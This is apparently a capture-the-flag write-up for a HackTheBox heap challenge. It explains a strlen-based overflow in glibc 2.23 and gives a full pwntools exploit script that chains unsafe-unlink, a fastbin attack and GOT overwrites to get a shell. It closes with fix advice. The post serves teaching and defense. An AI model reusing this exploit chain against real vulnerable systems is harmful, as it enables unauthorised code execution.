---
layout: post
title: "Dream Diary: Chapter 1"
date: 2027-12-23 09:00:00 -0500
categories: [HackTheBox, Challenges, Pwn]
tags: [hackthebox, challenge, pwn, binary-exploitation, heap, unsafe-unlink, fastbin-attack, glibc-2.23, got-overwrite, pwntools]
---

## Overview

Dream Diary: Chapter 1 is a HackTheBox **Pwn** challenge — a classic glibc **2.23** (Ubuntu 16.04, no tcache) heap note manager. It has no "show" option, so the whole game is turning one subtle length bug into a full [heap-based buffer overflow](https://cwe.mitre.org/data/definitions/122.html), then chaining unsafe-unlink → a fastbin attack onto the global note-pointer array → a GOT overwrite that manufactures a libc leak, and finally `system("bash")`.

The binary is **No PIE, Partial RELRO, Canary, NX**. No PIE is the key gift: the note array and the GOT live at fixed addresses, so a leak is only needed to compute `system`, not to place the writes.

## The technique

The menu is `[1] Allocate(size, data)`, `[2] Edit(index, data)`, `[3] Delete(index)`, `[4] Exit`.

The bug lives in the mismatch between how notes are written and re-written:

- **Allocate** reads exactly `size` bytes with `read()`, which does **not** NUL-terminate.
- **Edit** computes `len = strlen(notes[idx])` and reads `len` bytes back in.

So if a note is filled to capacity with no trailing `\0`, `strlen` walks straight into the **next chunk's size field** and returns a length larger than the note — Edit then writes past the end of the chunk into adjacent heap metadata. That is a heap overflow of attacker-chosen length. The improper NUL-termination ([CWE-170](https://cwe.mitre.org/data/definitions/170.html)) is the trigger; the [out-of-bounds write](https://cwe.mitre.org/data/definitions/787.html) is the primitive.

## Solution

The chain, in order:

1. **Shape the heap** — a big `0x500` chunk (freed to the unsorted bin) plus a run of `0x108`/`0x288`/`0x108`/`0x108` chunks, so a later overflow can forge a `prev_size` and shrink a neighbour's `size` (`0x290 → 0x280`).
2. **Overlap chunks** — after the size lie, free the middle chunks so glibc 2.23's backward consolidation (`unlink`) merges a region we still hold a pointer into. Now one note aliases another's data and metadata.
3. **Fastbin attack onto BSS** — through the overlap, plant a fake fastbin `fd` of `0x60209d`. glibc validates the target's size byte as `0x7f` (a `0x70` fastbin), which sits just before the note array, so the next `malloc(0x60)` returns a chunk whose user data begins inside the array. `0x13` bytes of filler then land exactly on `notes[0]=free@GOT`, `notes[1]=puts@GOT`, `notes[2]=atoi@GOT`.
4. **Leak libc** — Edit note 0 to overwrite `free@GOT = puts@PLT`, then `Delete(notes[1])` runs `free(notes[1])` = `puts(puts@GOT)`, printing the live address of `puts`. The leak is the **first** output line (the last line is the `>>` menu prompt).
5. **Shell** — Edit note 2 to overwrite `atoi@GOT = system`. The menu reads your choice into a buffer and calls `atoi(buf)`, so sending `bash` runs `system("bash")`.

The full, self-contained exploit:

```python
from pwn import *
import sys

context.arch = 'amd64'
binary = ELF('./dreamdiary1', checksec=False)
libc   = ELF('./libc-2.23.so', checksec=False)

p = remote(sys.argv[1], int(sys.argv[2])) if len(sys.argv) >= 3 else process('./dreamdiary1')

def alloc(size, data):
    p.recvrepeat(0.3); p.sendline(b'1')
    p.recvrepeat(0.3); p.sendline(str(size).encode())
    p.recvrepeat(0.3); p.send(data)

def edit(index, data):
    p.recvrepeat(0.3); p.sendline(b'2')
    p.recvrepeat(0.3); p.sendline(str(index).encode())
    p.recvrepeat(0.3); p.send(data)

def free(index):
    p.recvrepeat(0.3); p.sendline(b'3')
    p.recvrepeat(0.3); p.sendline(str(index).encode())

alloc(0x500, b'A' * 0x500)
free(0)
alloc(0x108, b'A' * 0x108)
alloc(0x288, b'B' * 0x270 + p64(0x280))
alloc(0x108, b'C' * 0x108)
alloc(0x108, b'D' * 0x108)
free(1)
edit(0, b'A' * 0x108 + b'\x80\x02')
alloc(0x80, b'E' * 0x80)
alloc(0x60, b'F' * 0x70)
free(1); free(2); free(4)

alloc(0x200, b'Z' * 0x80 + p64(0x90) + p64(0x71) + p64(0x60209d))
alloc(0x60, b'G')
alloc(0x60, b'A' * 0x13 + p64(binary.got['free']) + p64(binary.got['puts']) + p64(binary.got['atoi']))

edit(0, p64(binary.plt['puts']))
free(1)
leak = p.recvrepeat(1).split(b'\n')[0]
libc.address = u64(leak.ljust(8, b'\x00')) - libc.symbols['puts']
log.success('libc base = %#x', libc.address)

edit(2, p64(libc.symbols['system']))
p.recvrepeat(0.5)
p.sendline(b'bash')
p.interactive()
```

Running it against the instance leaks a page-aligned libc base and drops a shell as `ctf`, where `cat flag.txt` yields `HTB{...}`.

Two gotchas cost real time and are worth banking:

- **Match the exact libc.** Extract `libc-2.23.so` (and `ld-2.23.so`) straight from the `ubuntu:xenial-20210804` Docker base image the challenge's Dockerfile builds `FROM`, then `patchelf --set-interpreter ./ld-2.23.so --replace-needed libc.so.6 ./libc-2.23.so` a local copy of the binary and **validate the whole chain locally against the true no-tcache allocator before ever touching remote.** Xenial's final libc patch (`2.23-0ubuntu11.3`) is what the remote's `apt upgrade` lands on too.
- **Read the I/O helper before trusting a writeup.** Older writeups wrap sends in `.replace('\x16', ...)` / `.replace('\x7f', ...)` escaping. This binary's data reader is a plain `read(0, buf, n)` — no backspace/escape processing — and every 64-bit libc address contains a `0x7f` byte, so that escaping would silently corrupt the `system` write. Send raw bytes.

## Why it worked

glibc 2.23 has **no tcache** and only 2016-era `unlink`/fastbin hardening, so a forged `prev_size` plus a shrunk `size` is enough to consolidate over a chunk we still point into, and a fastbin `fd` overwrite lands allocations on an arbitrary writable address (the `0x7f`-size trick reaches BSS). Combined with No PIE — fixed note-array and GOT addresses — the exploit never needs an infoleak to *place* its writes, only to compute `system` from the leaked `puts`.

## Fix / defense

- Store an explicit per-note length and use it in Edit, or NUL-terminate on read — never let attacker-controlled data decide the write length via `strlen`.
- Enable **Full RELRO** (read-only GOT defeats the `free@GOT`/`atoi@GOT` overwrite) and **PIE** (no fixed BSS/GOT addresses).
- Modern glibc (tcache plus `unlink`/fastbin integrity checks) blocks the consolidation-over-a-live-chunk step outright.
